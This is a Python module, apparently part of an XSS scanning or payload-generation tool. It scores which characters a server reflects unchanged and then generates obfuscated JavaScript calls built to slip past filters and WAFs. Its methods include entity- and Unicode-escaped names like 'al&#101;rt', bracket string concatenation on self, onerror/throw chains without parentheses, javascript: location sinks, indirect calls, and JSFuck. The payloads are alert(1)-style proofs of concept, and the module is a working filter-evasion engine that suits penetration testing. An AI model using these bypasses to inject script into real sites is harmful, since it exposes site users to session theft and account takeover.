"""
Character efficiency scoring, gating, and JavaScript function-call obfuscators.

Covers:
  - Character score & escaped-quote extraction (`char_scores`, `escaped_quotes`)
  - Mid-word filter-deletion splitting (`split_str`)
  - HTML decimal/hex/padded/no-semicolon entity encoding (`entity_fname`, `entity_variants`, `encoded_funcs`)
  - JS 4-digit & ES6 brace Unicode escapes (`u_fname`, `u_funcs`, `u6_fname`, `u6_funcs`)
  - Global-object bracket string-concat & string escapes (`bracket_funcs`)
  - Call-junction bypasses when `(` and `)` pass but `alert(1)` is blocked (`indirect_call_funcs`)
  - Dynamic non-alphanumeric JSFuck fallbacks (`jsfuck_funcs`)
"""
from __future__ import annotations

import re
import secrets
from typing import Any, Iterable, Sequence

from .constants import DIALOG_FUNCS, GLOBAL_OBJECTS, PROBE_CHARS
from .jsfuck import jsfuck_encode

_HEX_DIGIT_RE = re.compile(r"[0-9a-fA-F]")


def char_scores(
    results: Sequence[dict[str, Any]], refl_idx: int
) -> dict[str, int]:
    """Per-character efficiency: 100 unchanged, 50 transformed-but-present,
    0 removed/encoded away."""
    scores: dict[str, int] = {}
    for r in results:
        if r["reflection_index"] != refl_idx:
            continue
        exp, got = r["expected"], r["got_back"] or ""
        if r["passed"]:
            scores[exp] = 100
        elif exp in got:
            scores[exp] = 50
        else:
            scores[exp] = 0
    return scores


def escaped_quotes(
    results: Sequence[dict[str, Any]], refl_idx: int
) -> set[str]:
    """Quote chars that the server backslash-escaped (`"` -> `\\"`, `'` -> `\\'`)."""
    esc: set[str] = set()
    for r in results:
        if r["reflection_index"] != refl_idx:
            continue
        exp, got = r["expected"], r["got_back"] or ""
        if exp in ("'", '"', "`") and got == "\\" + exp:
            esc.add(exp)
    return esc


def usable(ch: str, scores: dict[str, int]) -> bool:
    """Return `True` if probe character `ch` survived unchanged (score >= 100)."""
    return scores.get(ch, 0) >= 100


def min_eff(payload: str, scores: dict[str, int]) -> int:
    """Worst efficiency among the six probe chars the payload actually uses."""
    used = [c for c in payload if c in PROBE_CHARS]
    if not used:
        return 100
    return min(scores.get(c, 0) for c in used)


def required_ok(
    payload: str,
    scores: dict[str, int],
    allow_chars: Iterable[str] | None = None,
) -> bool:
    """Gate: only emit payload if every probe char it needs scored 100
    (or is explicitly permitted via `allow_chars`)."""
    probe = PROBE_CHARS - set(allow_chars or ())
    return all(scores.get(c, 0) == 100 for c in payload if c in probe)


def split_str(target: str, s: str) -> str:
    """Insert a filter-removed string `s` inside a blocked `target` at the
    midpoint so the filter's removal merges the halves back into `target`."""
    k = max(1, len(target) // 2)
    return target[:k] + s + target[k:]


def entity_fname(name: str) -> str:
    """Encode ONE random letter of a JS fn name as a decimal char ref
    (`'alert'` -> `'al&#101;rt'`). Valid inside HTML attribute values."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"&#{ord(name[i])};" + name[i + 1 :]


def entity_variants(name: str, kw: dict[str, bool]) -> str | None:
    """Alternative char-ref spellings for ONE letter: hex, padded decimal,
    capital-X, and no-semicolon forms (`'al&#x65;rt'`, `'al&#0000101;rt'`,
    `'al&#X65;rt'`, `'al&#x65rt'`)."""
    if not (kw.get("hex_ref", True) or kw.get("nosemi_ref", True)):
        return None
    i = secrets.randbelow(len(name))
    cp = ord(name[i])
    nxt = name[i + 1] if i + 1 < len(name) else ""
    forms: list[str] = []
    if kw.get("hex_ref", True):
        forms += [f"&#x{cp:x};", f"&#{cp:07d};", f"&#X{cp:X};"]
    if kw.get("nosemi_ref", True):
        if not nxt or not nxt.isdigit():
            forms.append(f"&#{cp}")
        if not nxt or not _HEX_DIGIT_RE.match(nxt):
            forms.append(f"&#x{cp:x}")
    if not forms:
        return None
    return name[:i] + secrets.choice(forms) + name[i + 1 :]


def _throw_ops(kw: dict[str, bool]) -> tuple[str, str]:
    """Operands for the `onerror=...;throw` idiom. When `' '` is dead, only
    space-free operands (`throw-1`, `throw/1/`) are used."""
    if kw.get("space") is False:
        return ("throw-1", "throw/1/")
    return ("throw 1", "throw-1")


def _throw_forms(
    fn_expr: str, kw: dict[str, bool], include_block_fallback: bool = False
) -> list[str]:
    """Build exception-handler invocation strings for `fn_expr`.

    Progression when `()` and `` ` `` are blocked:
      1. Semicolon-separated: `onerror=fn;throw 1` (when `;` is allowed)
      2. Block-separated:     `{onerror=fn}throw 1` (when `;` is blocked but `{}` is allowed)
      3. Comma-operator:      `throw onerror=fn,1` (when ` ` is allowed) or
                              `throw/**/onerror=fn,1` / `throw-0,onerror=fn,1`
                              (when `;`, `{}`, AND `' '` are all blocked!)
    """
    ops = _throw_ops(kw)
    semi_ok = kw.get("semicolon") is not False
    braces_ok = (
        kw.get("braces") is not False and kw.get("interp") is not False
    )
    space_ok = kw.get("space") is not False

    if space_ok:
        comma_forms = [
            f"throw onerror={fn_expr},1",
            f"throw-0,onerror={fn_expr},1",
        ]
    else:
        comma_forms = [
            f"throw/**/onerror={fn_expr},1",
            f"throw-0,onerror={fn_expr},1",
        ]

    if not semi_ok and not braces_ok:
        return comma_forms
    if not semi_ok:
        return [f"{{onerror={fn_expr}}}{op}" for op in ops] + comma_forms

    out = [f"onerror={fn_expr};{op}" for op in ops]
    if include_block_fallback:
        if braces_ok:
            out += [f"{{onerror={fn_expr}}}{op}" for op in ops]
        out += comma_forms
    return out


def encoded_funcs(kw: dict[str, bool]) -> list[str]:
    """Dialog-fn call strings with one letter entity-encoded, emitted ONLY
    for call forms whose plain version is blocked by the keyword mask."""
    if not kw.get("char_ref", kw.get("entity_lt", True)):
        return []
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    out: list[str] = []
    for name in DIALOG_FUNCS:
        arg = "()" if name == "print" else "(1)"
        enc = entity_fname(name)
        var = entity_variants(name, kw)
        if parens and (
            not kw.get(name, True) or not kw.get(f"call_{name}", True)
        ):
            out.append(f"{enc}{arg}")
            if var:
                out.append(f"{var}{arg}")
        if btick and (
            not kw.get(name, True) or not kw.get(f"tick_{name}", True)
        ):
            out.append(f"{enc}`1`")
            if var:
                out.append(f"{var}`1`")
        if not parens and not btick and not kw.get(name, True):
            for tf in _throw_forms(enc, kw):
                out.append(tf)
            if var:
                for tf in _throw_forms(var, kw):
                    out.append(tf)
    return out


def u_fname(name: str) -> str:
    """Encode ONE random letter of a JS fn name as a 4-digit unicode escape
    (`'alert'` -> `'al\\u0065rt'`)."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"\\u{ord(name[i]):04x}" + name[i + 1 :]


def u_funcs(kw: dict[str, bool]) -> list[str]:
    """Unicode-escaped call strings for dialog-fns whose plain form is blocked."""
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    out: list[str] = []
    for name in DIALOG_FUNCS:
        arg = "()" if name == "print" else "(1)"
        enc = u_fname(name)
        if parens and (
            not kw.get(name, True) or not kw.get(f"call_{name}", True)
        ):
            out.append(f"{enc}{arg}")
        if btick and (
            not kw.get(name, True) or not kw.get(f"tick_{name}", True)
        ):
            out.append(f"{enc}`1`")
        if not parens and not btick and not kw.get(name, True):
            out.extend(_throw_forms(enc, kw))
    return out


def u6_fname(name: str) -> str:
    """Encode ONE random letter of a JS fn name as an ES6 brace-form unicode
    escape (`'alert'` -> `'al\\u{65}rt'`)."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"\\u{{{ord(name[i]):x}}}" + name[i + 1 :]


def u6_funcs(kw: dict[str, bool]) -> list[str]:
    """ES6 `\\u{XX}` call strings for dialog-fns whose plain form is blocked."""
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    if not kw.get("gen_u6brace", True):
        return []
    out: list[str] = []
    for name in DIALOG_FUNCS:
        arg = "()" if name == "print" else "(1)"
        enc = u6_fname(name)
        if parens and (
            not kw.get(name, True) or not kw.get(f"call_{name}", True)
        ):
            out.append(f"{enc}{arg}")
        if btick and (
            not kw.get(name, True) or not kw.get(f"tick_{name}", True)
        ):
            out.append(f"{enc}`1`")
        if not parens and not btick and not kw.get(name, True):
            out.extend(_throw_forms(enc, kw))
    return out


def bracket_funcs(
    kw: dict[str, bool],
    forbid_q: str | None = None,
    scores: dict[str, int] | None = None,
) -> list[str]:
    """Global-object string-concat & quoteless property calls (`self['a'+'lert'](1)`,
    `self[/al/.source+/ert/.source](1)`, `self[8680439..toString(30)](1)`),
    emitted ONLY for names whose plain call form is blocked.

    When `'` or `"` (or both) are blocked in `scores`, quoteless property
    builders (`RegExp.prototype.source` and `Number.prototype.toString`) are
    prioritized at the front of each function's candidate list so they are
    emitted immediately without jumping straight to 600-char JSFuck.
    """
    if not kw.get("gen_bracket", True):
        return []
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    quotes = [q for q in ("'", '"') if q != forbid_q] or ["'"]
    quote_restricted = scores is not None and (
        not usable("'", scores) or not usable('"', scores)
    )
    slash_ok = scores is None or usable("/", scores)
    per_name: list[list[str]] = []
    for oi, name in enumerate(DIALOG_FUNCS):
        if kw.get(name, True) and kw.get(
            f"call_{name}", kw.get("gen_call", True)
        ):
            continue
        arg = "()" if name == "print" else "(1)"
        obj = GLOBAL_OBJECTS[oi % len(GLOBAL_OBJECTS)]
        name_ok = kw.get(name, True)
        splits = [(name[:k], name[k:]) for k in range(1, len(name))]
        mid = max(1, len(name) // 2)
        cp = ord(name[0])

        # Quoteless property expressions (0 single/double quotes needed)
        quoteless: list[str] = []
        if slash_ok:
            quoteless.append(
                f"self[/{name[:mid]}/.source+/{name[mid:]}/.source]"
            )
        if parens:
            if name == "alert":
                quoteless.append("self[8680439..toString(30)]")
            quoteless.append(f"self[{int(name, 36)}..toString(36)]")

        exprs: list[str] = []
        if quote_restricted:
            exprs.extend(quoteless)
        for q in quotes:
            if name_ok:
                exprs.append(f"self[{q}{name}{q}]")
                exprs.append(f"self[{q}\\{name[0]}{name[1:]}{q}]")
            exprs.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]")
            exprs.append(f"self[{q}\\{cp:03o}{name[1:]}{q}]")
            exprs.append(f"self[{q}\\u{{{cp:x}}}{name[1:]}{q}]")
            for fst, rst in splits:
                exprs.append(f"self[{q}{fst}{q}+{q}{rst}{q}]")
        if obj != "self":
            q = quotes[0]
            if name_ok:
                exprs.append(f"{obj}[{q}{name}{q}]")
            exprs.append(f"{obj}[{q}\\x{cp:02x}{name[1:]}{q}]")
            for fst, rst in splits:
                exprs.append(f"{obj}[{q}{fst}{q}+{q}{rst}{q}]")
        q, (fst, rst) = quotes[0], splits[0]
        exprs.append(f"{obj}[{q}\\x{cp:02x}{q}+{q}{rst}{q}]")
        exprs.append(f"{obj}[{q}\\{cp:03o}{q}+{q}{rst}{q}]")
        exprs.append(f"{obj}[{q}\\u{{{cp:x}}}{q}+{q}{rst}{q}]")
        if not quote_restricted:
            exprs.extend(quoteless)

        if parens:
            v = [f"{e}{arg}" for e in exprs]
        elif btick:
            v = [f"{e}`1`" for e in exprs]
        else:
            v = [tf for e in exprs for tf in _throw_forms(e, kw)]
        per_name.append(v)

    out: list[str] = []
    for i in range(max((len(v) for v in per_name), default=0)):
        for v in per_name:
            if i < len(v):
                out.append(v[i])
    return out


def noparens_funcs(
    kw: dict[str, bool], forbid_q: str | None = None
) -> list[str]:
    """Parentheses-free AND semicolon-free bypass primitives (`case/xss without parentheses.md` #2 & #4).

    Activated ONLY when `()` call syntax is blocked (`not parens` or `not gen_call`).
    Emits:
      1. `{onerror=alert}throw 1` / `{onerror=alert}throw-1` (block statement, 0 `;` and 0 `()`)
      2. `throw onerror=alert,1` (comma expression inside `throw`, 0 `;`, 0 `{}`, 0 `()`)
      3. `location='javascript:alert\\x281\\x29'` (hex-escaped parens inside navigation sink)
    """
    parens_ok = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick_ok = kw.get("backtick", True) and kw.get("gen_tick", True)
    if parens_ok or btick_ok:
        return []

    ops = _throw_ops(kw)
    space_alive = kw.get("space") is not False
    quotes = [q for q in ("'", '"') if q != forbid_q] or ["'"]
    out: list[str] = []

    surviving_names = [n for n in DIALOG_FUNCS if kw.get(n, True)]

    for name in surviving_names:
        if kw.get("braces") is not False and kw.get("interp") is not False:
            for op in ops:
                out.append(f"{{onerror={name}}}{op}")
        if space_alive:
            out.append(f"throw onerror={name},1")
            out.append(f"throw-0,onerror={name},1")
        else:
            out.append(f"throw/**/onerror={name},1")
            out.append(f"throw-0,onerror={name},1")

    if kw.get("javascript_proto", True):
        for q in quotes:
            for name in DIALOG_FUNCS:
                if kw.get(name, True):
                    arg_hex = "\\x28\\x29" if name == "print" else "\\x281\\x29"
                    out.append(f"location={q}javascript:{name}{arg_hex}{q}")
                    break
            else:
                out.append(
                    f"location={q}javascript:\\x61lert\\x281\\x29{q}"
                )

    return out


def indirect_call_funcs(
    kw: dict[str, bool], slash_ok: bool = True
) -> list[str]:
    """Call-junction bypasses for when `(` and `)` (or backtick) AND the dialog
    function name (`alert`, `confirm`, `prompt`, `print`) survive individually,
    but the WAF blocks the direct `name(1)` junction (`call_alert=False`) or
    generic `ident()` calls (`gen_call=False`).

    Requires ZERO quotes and ZERO backslashes, rescuing contexts where both
    `u_funcs` (`\\` blocked) and `bracket_funcs` (`'`/`"` blocked) fail:
      - `alert?.(1)`           : ES2020 optional-chaining call
      - `(alert)(1)`           : parenthesized callee expression
      - `(0,alert)(1)`         : comma-operator indirect evaluation
      - `[1].find(alert)`      : higher-order array callback (`alert` as arg)
      - `alert/**/(1)`         : inline block-comment separator
      - `Reflect.apply(alert,0,[1])` : Reflect call indirection
    """
    parens_atom = kw.get("parentheses", True)
    btick_atom = kw.get("backtick", True)
    gen_call_ok = kw.get("gen_call", True)
    comment_ok = slash_ok and kw.get("comment_close", True)
    per_name: list[list[str]] = []

    for name in DIALOG_FUNCS:
        if not kw.get(name, True):
            continue
        arg = "()" if name == "print" else "(1)"
        call_blocked = not kw.get(f"call_{name}", True) or not gen_call_ok
        tick_blocked = not kw.get(f"tick_{name}", True) or not kw.get(
            "gen_tick", True
        )
        variants: list[str] = []
        if parens_atom and call_blocked:
            variants.append(f"{name}?.{arg}")
            variants.append(f"({name}){arg}")
            variants.append(f"(0,{name}){arg}")
            if name != "print" and gen_call_ok:
                variants.append(f"[1].find({name})")
            if comment_ok:
                variants.append(f"{name}/**/{arg}")
            if gen_call_ok:
                variants.append(
                    f"Reflect.apply({name},0,[])"
                    if name == "print"
                    else f"Reflect.apply({name},0,[1])"
                )
        elif not parens_atom and btick_atom and tick_blocked:
            if comment_ok:
                variants.append(f"{name}/**/`1`")
        if variants:
            per_name.append(variants)

    out: list[str] = []
    for i in range(max((len(v) for v in per_name), default=0)):
        for v in per_name:
            if i < len(v):
                out.append(v[i])
    return out


def jsfuck_funcs(
    kw: dict[str, bool],
    compact: bool = False,
    eval_source: bool = True,
) -> list[str]:
    """Dynamically synthesize non-alphanumeric JSFuck payloads when parentheses
    survive (`parentheses=True`) and either a letter-stripping filter is active
    or all alphabetic function/sink primitives are blocked."""
    if not kw.get("parentheses", True):
        return []
    out: list[str] = []
    if compact:
        out.append(
            jsfuck_encode("alert(1)", eval_source=eval_source, compact=True)
        )
    out.append(
        jsfuck_encode("alert(1)", eval_source=eval_source, compact=False)
    )
    return out


def junction_ok(
    item: str, kw: dict[str, bool], kwv: dict[str, tuple[str, str]]
) -> bool:
    """Refined junction-probe verdict: returns `True` if `item` passed or if
    its failure was caused solely by the filter stripping a blocked dialog
    function name while the surrounding breakout syntax survived."""
    if kw.get(item, True):
        return True
    e, g = kwv.get(item, ("", ""))
    if not e:
        return False
    stripped = e
    for n in DIALOG_FUNCS:
        if not kw.get(n, True):
            stripped = stripped.replace(n, "")
    return stripped == g


def avail_funcs(kw: dict[str, bool]) -> list[str]:
    """Direct JS call primitives allowed by the keyword mask (Layer B/C gate)."""
    parens = kw.get("parentheses", True)
    btick = kw.get("backtick", True)
    call_shape = parens and kw.get("gen_call", True)
    tick_shape = btick and kw.get("gen_tick", True)
    funcs: list[str] = []
    for name in DIALOG_FUNCS:
        if not kw.get(name, True):
            continue
        arg = "()" if name == "print" else "(1)"
        if parens and kw.get(f"call_{name}", kw.get("gen_call", True)):
            funcs.append(f"{name}{arg}")
        if btick and kw.get(f"tick_{name}", kw.get("gen_tick", True)):
            funcs.append(f"{name}`1`")
        if not call_shape and not tick_shape:
            funcs.extend(_throw_forms(name, kw))
    return funcs
